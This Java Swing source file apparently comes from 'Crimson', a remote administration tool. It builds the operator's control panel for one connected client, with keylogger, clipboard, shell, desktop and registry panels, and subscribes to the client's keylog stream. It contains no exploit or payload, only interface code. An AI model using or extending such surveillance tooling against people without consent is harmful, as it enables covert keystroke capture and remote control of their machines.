/******************************************************************************
 *                                                                            *
 *                    Copyright 2016 Subterranean Security                    *
 *                                                                            *
 *  Licensed under the Apache License, Version 2.0 (the "License");           *
 *  you may not use this file except in compliance with the License.          *
 *  You may obtain a copy of the License at                                   *
 *                                                                            *
 *      http://www.apache.org/licenses/LICENSE-2.0                            *
 *                                                                            *
 *  Unless required by applicable law or agreed to in writing, software       *
 *  distributed under the License is distributed on an "AS IS" BASIS,         *
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  *
 *  See the License for the specific language governing permissions and       *
 *  limitations under the License.                                            *
 *                                                                            *
 *****************************************************************************/
package com.subterranean_security.crimson.viewer.ui.screen.controlpanels.client;

import java.awt.BorderLayout;
import java.awt.CardLayout;
import java.awt.Component;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;

import javax.swing.Box;
import javax.swing.ImageIcon;
import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.JSplitPane;
import javax.swing.JTree;
import javax.swing.border.BevelBorder;
import javax.swing.event.TreeSelectionEvent;
import javax.swing.event.TreeSelectionListener;
import javax.swing.tree.DefaultMutableTreeNode;
import javax.swing.tree.DefaultTreeCellRenderer;
import javax.swing.tree.DefaultTreeModel;

import com.subterranean_security.crimson.core.platform.info.OS.OSFAMILY;
import com.subterranean_security.crimson.core.profile.SimpleAttribute;
import com.subterranean_security.crimson.core.proto.Stream.SubscriberParam;
import com.subterranean_security.crimson.core.stream.StreamStore;
import com.subterranean_security.crimson.core.stream.subscriber.SubscriberMaster;
import com.subterranean_security.crimson.sv.profile.ClientProfile;
import com.subterranean_security.crimson.viewer.net.ViewerCommands;
import com.subterranean_security.crimson.viewer.ui.UICommon;
import com.subterranean_security.crimson.viewer.ui.UIStore;
import com.subterranean_security.crimson.viewer.ui.UIUtil;
import com.subterranean_security.crimson.viewer.ui.common.components.Console;
import com.subterranean_security.crimson.viewer.ui.common.components.Console.LineType;
import com.subterranean_security.crimson.viewer.ui.common.panels.sl.epanel.EPanel;
import com.subterranean_security.crimson.viewer.ui.screen.controlpanels.client.controls.ControlsTab;
import com.subterranean_security.crimson.viewer.ui.screen.controlpanels.client.keylogger.Keylogger;
import com.subterranean_security.crimson.viewer.ui.screen.controlpanels.client.logs.Logs;

/**
 * This class technically should not implement CPPanel, but it is convenient
 *
 */
public class ClientCPFrame extends JFrame implements CPPanel {

	private static final long serialVersionUID = 1L;

	public ClientProfile profile;

	private JTree tree = new JTree();
	private JPanel cards = new JPanel();
	private EPanel ep = new EPanel(cards);

	public Console console = new Console();

	private SubscriberMaster keylogStream;

	private HashMap<Panels, CPPanel> panels = new HashMap<Panels, CPPanel>();
	private final JPanel panel_1 = new JPanel();
	private final JSplitPane splitPane = new JSplitPane();

	public ClientCPFrame(ClientProfile cp) {
		profile = cp;
		init();
		console.addLine("Initialized control panel");

		new Thread(new Runnable() {
			public void run() {
				ViewerCommands.trigger_key_update(profile.getCid(), cp.getKeylog().timestamp);
				keylogStream = new SubscriberMaster(SubscriberParam.newBuilder().setKeylog(true).build(),
						profile.getCid());
				StreamStore.addStream(keylogStream);
			}
		}).start();
	}

	public void init() {

		setTitle("Client Control Panel (" + profile.getAttr(SimpleAttribute.NET_HOSTNAME) + ")");
		setIconImages(UIUtil.getIconList());
		setResizable(true);
		setMinimumSize(UICommon.dim_control_panel);
		getContentPane().setLayout(new BorderLayout(0, 0));
		setDefaultCloseOperation(DISPOSE_ON_CLOSE);
		splitPane.setOrientation(JSplitPane.VERTICAL_SPLIT);
		splitPane.setDividerLocation(0.85d);
		splitPane.setResizeWeight(0.85d);

		getContentPane().add(splitPane, BorderLayout.CENTER);

		splitPane.setTopComponent(panel_1);
		panel_1.setLayout(new BorderLayout(0, 0));
		panel_1.add(ep, BorderLayout.CENTER);
		cards.setBorder(new BevelBorder(BevelBorder.LOWERED, null, null, null, null));
		cards.setLayout(new CardLayout(0, 0));

		JPanel panel = new JPanel();
		panel_1.add(panel, BorderLayout.WEST);
		panel.setLayout(new BorderLayout(0, 0));
		panel.add(Box.createHorizontalStrut(50), BorderLayout.SOUTH);
		tree.setBorder(new BevelBorder(BevelBorder.LOWERED, null, null, null, null));

		tree.setModel(new DefaultTreeModel(new DefaultMutableTreeNode(profile.getAttr(SimpleAttribute.NET_HOSTNAME)) {

			private static final long serialVersionUID = 1L;

			{
				for (Panels p : getValidPanels()) {
					this.add(new DefaultMutableTreeNode(p));
				}
			}
		}));
		tree.setCellRenderer(new DefaultTreeCellRenderer() {

			private static final long serialVersionUID = 1L;

			// TODO platform specific
			private ImageIcon host = UIUtil.getIcon("icons16/general/viewer.png");

			private ImageIcon controls = UIUtil.getIcon("icons16/general/cog.png");
			private ImageIcon keylogger = UIUtil.getIcon("icons16/general/keyboard.png");
			private ImageIcon logs = UIUtil.getIcon("icons16/general/error_log.png");
			private ImageIcon clipboard = UIUtil.getIcon("icons16/general/paste_plain.png");
			private ImageIcon webfilter = UIUtil.getIcon("icons16/general/www_page.png");

			@Override
			public Component getTreeCellRendererComponent(JTree tree, Object value, boolean selected, boolean expanded,
					boolean isLeaf, int row, boolean focused) {
				Object userObject = ((DefaultMutableTreeNode) value).getUserObject();
				if (userObject instanceof Panels) {

					Panels type = (Panels) userObject;

					super.getTreeCellRendererComponent(tree, type.toString(), selected, expanded, isLeaf, row, focused);
					switch (type) {
					case CONTROLS:
						setIcon(controls);
						break;
					case KEYLOGGER:
						setIcon(keylogger);
						break;
					case LOGS:
						setIcon(logs);
						break;
					case CLIPBOARD:
						setIcon(clipboard);
						break;
					case WEBFILTER:
						setIcon(webfilter);
						break;
					default:
						break;

					}

				} else {
					super.getTreeCellRendererComponent(tree, userObject, selected, expanded, isLeaf, row, focused);
					setIcon(host);
				}
				return this;

			}
		});

		// select controls
		tree.addSelectionInterval(1, 1);
		tree.addTreeSelectionListener(new TreeListener());

		panel.add(tree);
		splitPane.setBottomComponent(console);

		for (Panels p : getValidPanels()) {
			switch (p) {
			case CONTROLS:
				ControlsTab tab = new ControlsTab(ep, profile, console);
				cards.add(p.toString(), tab);
				panels.put(p, tab);
				break;
			case KEYLOGGER:
				Keylogger tab2 = new Keylogger(profile, console);
				cards.add(p.toString(), tab2);
				panels.put(p, tab2);
				break;
			case LOGS:
				Logs tab3 = new Logs(profile, console);
				cards.add(p.toString(), tab3);
				panels.put(p, tab3);
				break;
			default:
				break;

			}
		}

	}

	@Override
	public void clientOffline() {
		setTitle("Control Panel: " + profile.getAttr(SimpleAttribute.NET_HOSTNAME) + " (client offline)");
		console.addLine("The client has disconnected!", LineType.ORANGE);
		for (CPPanel panel : panels.values()) {
			panel.clientOffline();
		}
	}

	@Override
	public void serverOffline() {
		setTitle("Control Panel: " + profile.getAttr(SimpleAttribute.NET_HOSTNAME) + " (server offline)");
		for (CPPanel panel : panels.values()) {
			panel.serverOffline();
		}
	}

	@Override
	public void clientOnline() {
		setTitle("Control Panel: " + profile.getAttr(SimpleAttribute.NET_HOSTNAME));
		console.addLine("The client has reconnected!", LineType.GREEN);
		for (CPPanel panel : panels.values()) {
			panel.clientOnline();
		}
	}

	@Override
	public void serverOnline() {
		for (CPPanel panel : panels.values()) {
			panel.serverOnline();
		}
	}

	class TreeListener implements TreeSelectionListener {

		@Override
		public void valueChanged(TreeSelectionEvent e) {
			DefaultMutableTreeNode node = (DefaultMutableTreeNode) tree.getLastSelectedPathComponent();
			if (node == null || node.getUserObject() instanceof String) {
				return;
			}

			for (Panels panel : panels.keySet()) {
				if (panel == (Panels) node.getUserObject()) {
					panels.get(panel).tabOpened();
				} else {
					panels.get(panel).tabClosed();
				}
			}

			((CardLayout) cards.getLayout()).show(cards, node.getUserObject().toString());

		}

	}

	public enum Panels {
		// Multiplatform
		CONTROLS, KEYLOGGER, CLIPBOARD, WEBFILTER, DESKTOP, SHELL, LOGS, LOCATION,
		// Windows specific
		REGISTRY;

		@Override
		public String toString() {
			switch (this) {
			case CONTROLS:
				return "Controls";
			case KEYLOGGER:
				return "Keylogger";
			case CLIPBOARD:
				return "Clipboard";
			case WEBFILTER:
				return "Web Filter";
			case LOGS:
				return "Log Files";
			default:
				return null;

			}
		}

		public boolean isValid(OSFAMILY os) {
			switch (this) {
			case REGISTRY:
				return os == OSFAMILY.WIN;
			default:
				return true;

			}
		}
	}

	public ArrayList<Panels> getValidPanels() {
		ArrayList<Panels> p = new ArrayList<Panels>();
		for (Panels panel : Panels.values()) {
			if (panel.isValid(profile.getOSFamily())) {
				p.add(panel);
			}

		}

		return p;
	}

	@Override
	public void dispose() {
		super.dispose();
		new Thread(new Runnable() {
			public void run() {
				StreamStore.removeStreamBySID(keylogStream.getStreamID());

				// remove from UIStore
				Iterator<ClientCPFrame> it = UIStore.clientControlPanels.iterator();
				while (it.hasNext()) {
					ClientCPFrame cf = it.next();
					if (profile.getCid() == cf.profile.getCid()) {
						it.remove();
						break;
					}
				}
			}
		}).start();
	}

	@Override
	public void tabOpened() {
		// ignore
	}

	@Override
	public void tabClosed() {
		// ignore
	}
}
